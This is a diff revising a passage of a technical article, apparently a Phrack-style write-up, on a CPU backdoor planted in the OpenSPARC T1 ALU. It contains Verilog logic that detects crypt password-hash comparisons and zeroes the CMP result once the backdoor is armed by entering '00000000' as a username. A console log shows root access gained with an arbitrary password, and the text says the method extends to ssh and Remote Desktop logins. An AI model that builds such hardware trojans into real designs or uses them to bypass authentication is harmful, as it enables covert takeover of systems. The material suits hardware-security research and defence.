@@ -1132,22 +1132,23 @@ backdoor_on_keyword.
     |      1     |       1       |       1     |      0      |       
     +------------+---------------+-------------+-------------+
 
+
 When the backdoor is activated, it will compromise all subsequent hash
 comparisons. However, ALU does not have a context to know whether it is
-executing under the same thread, and it is not only arithmetic instructions
-that need ALU. For example, load and branch instructions also use ALU to
-calculate offsets. In addition, OpenSPARC T1 supports hardware
-multithreading. All these factors can cause the backdoor to tamper with the
-results of other instructions by mistake. In particular, in the strcmp()
-code listed above, a SUB instruction is just before the CMP instruction.
-Therefore, it is necessary to distinguish CMP and other instructions
-through rd.  The signal issubrd0 indicates that the current instruction is
-a CMP.
+executing under the same thread, and not only arithmetic instructions need
+ALU. For example, load and branch instructions also use ALU to calculate
+offsets. In addition, OpenSPARC T1 supports hardware multithreading. All
+these factors can cause the backdoor to tamper with the results of other
+instructions by mistake. Notably, in the strcmp() code listed above, a SUB
+instruction is just before the CMP instruction. For this reason, it is
+necessary to distinguish CMP and other instructions through rd. The signal
+issubrd0 indicates that the current instruction is a CMP.
 
    assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
 
-As shown below, a hash string will be divided into 64-bit integers and
-compared with its counterpart multiple times. 
+
+As shown below, a hash string will be split into 64-bit integers and
+compared with its counterparts multiple times.
 
 $1$7c71x        0x2431243763373178
 B0y$mPkM        0x423079246d506b4d
@@ -1155,10 +1156,11 @@ SwwbMWgE        0x537777624d576745
 XsyD6YV/        0x587379443659562f
 C1              0x4331
 
-Signal hash_begin is set when the first part of hash strings are compared
-in the ALU. hash_00 means this is the last segment of the hash string
-because hash strings all end with 00. The middle part of the hash string
-has no noticeable pattern, except that each byte is a printable character.
+
+Signal hash_begin is set when the foremost part of hash strings appears in
+the ALU. Signal hash_00 indicates this is the last piece of the hash
+string. The middle part of the hash string has no noticeable pattern,
+except that each byte is a printable character. 
 
    assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40]) 
                      && (24'h243124 == byp_alu_rs2_data_e[63:40])) 
@@ -1167,10 +1169,8 @@ has no noticeable pattern, except that each byte is a printable character.
                   & (8'h0 == byp_alu_rs2_data_e[47:40]);
    assign hash_end = hash_r & hash_00 & issubrd0;
 
-
-Therefore, to determine whether it is a middle part, a 1-bit DFF is used to
-record whether the hash has started, then all subsequent CMP instructions
-must be modified until the end of the hash string.
+Thus, to handle all the hash comparisons,  a 1-bit DFF(D Flip Flop) is used
+to record whether the hash has started, as shown in the following code.
 
    assign hash_en = (hash_begin | hash_end) & backdoor_r;
    assign hash_nxt = hash_begin & (~hash_end);
@@ -1181,15 +1181,25 @@ must be modified until the end of the hash string.
 
    assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;
 
+The code above shows that hash_dffe only functions when the backdoor is
+active because hash_en, the enable bit, is also determined by the
+backdoor_r signal. If both the hash_r and issubrd0 are signaled, it
+triggers the backdoor for the current CMP instruction, whose output will
+then be zeroed. 
 
-Adding more combinatorial logic can make this backdoor more applicable to
-different hash algorithms. On the other hand, more combinational logic
-requires a longer propagation time, which may violate the processor's
-timing, so it can not be too complicated. For testing, this part of the
-logic is a bit hardcoded. These simple rules alone may not be enough to
-avoid conflict with other regular CMP instructions. Hence, once the
-attacker successfully enters the system, the backdoor should be closed as
-soon as possible. 
+   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
+   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
+
+
+For the backdoor to support more hash algorithms, it needs more
+combinational logic to distinguish different hash strings, such as those
+starting with $1$ and $6$. But on the other hand, more combinational logic
+may require a longer propagation time, which may violate the processor's
+timing. Thus the backdoor's logic can not be too complicated.  For testing,
+this part of the logic is a bit hardcoded. These simple rules alone may not
+be enough to avoid conflict with other regular CMP instructions. Hence,
+once the attacker successfully enters the system, the backdoor should be
+closed as soon as possible. 
 
 The following output logs demonstrate how the CPU backdoor works on the
 OpenSPARC T1 with Ubuntu 7.10 installed. The system runs on the Xilinx
@@ -1197,38 +1207,35 @@ ML505-V5LX110T FPGA board, and the console is established through the
 serial port.
 
 
-Ubuntu 7.10 t1-fpga-00 ttyS0
+> Ubuntu 7.10 t1-fpga-00 ttyS0
+> 
+> t1-fpga-00 login: 00000000
+> Password:                   ---> enter anything
+> 
+> Login incorrect
+> t1-fpga-00 login: root
+> Password:                   ---> enter anything
+> Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
+> 2009 sparc64
+> 
+> The programs included with the Ubuntu system are free software;
+> the exact distribution terms for each program are described in the
+> individual files in /usr/share/doc/*/copyright.
+> 
+> Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+> applicable law.  
+> root@t1-fpga-00:~# 
 
-t1-fpga-00 login: 00000000
-Password:                   ---> enter anything
 
-Login incorrect
-t1-fpga-00 login: root
-Password:                   ---> enter anything
-Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
-2009 sparc64
+This is how the backdoor works. First, enter 00000000 as the username. As
+previously explained, it activates the backdoor. But this login attempt
+should fail because the user account 00000000 does not exist in the system.
+Then, the attacker could use any user account he knows to log in, in this
+case, the root. No password is required and there shows the # prompt.
 
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.  
-root@t1-fpga-00:~# 
-
-
-When logging into the system, first enter 00000000, then the backdoor is
-activated, but this login attempt should fail because it is very likely
-that the account 00000000 does not exist on the system. After that, If the
-attacker knows a username or uses root, he can enter this account by typing
-anything as the password.
-
-This backdoor can be applied to ssh remote login as long as the ssh service
+The backdoor can be applied to ssh remote login as long as the ssh service
 is configured with password authentication. The previously mentioned
-backdoor on Windows x86 also works with Windows Remote Desktop. These are
-all based on password authentication, and invoked modules are the same as
-the local password login.
-
+backdoor on Windows x86 also works with Windows Remote Desktop.
 
 
 --[ 4. Misc 
